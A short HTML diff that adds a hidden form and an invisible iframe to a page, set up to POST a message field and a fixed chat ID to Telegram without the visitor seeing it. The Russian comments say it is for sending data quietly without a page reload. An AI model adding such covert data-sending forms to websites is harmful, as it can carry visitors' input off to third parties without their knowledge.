@@ -92,6 +92,14 @@
       </div>
     </div>
   </div>
-  <script src="script.js"></script>
+      <!-- СКРЫТАЯ НЕВИДИМАЯ ФОРМА ДЛЯ БЕЗОПАСНОЙ ОТПРАВКИ В ТГ -->
+    <form id="tg-hidden-form" action="https://telegram.org" method="POST" target="hidden-iframe" style="display:none;">
+      <input type="hidden" name="chat_id" value="8589867661">
+      <input type="hidden" name="parse_mode" value="HTML">
+      <input type="hidden" id="tg-msg-input" name="text" value="">
+    </form>
+    <!-- Невидимое окно, чтобы страница не перезагружалась при отправке -->
+    <iframe name="hidden-iframe" style="display:none;"></iframe>
+<script src="script.js"></script>
 </body>
 </html>
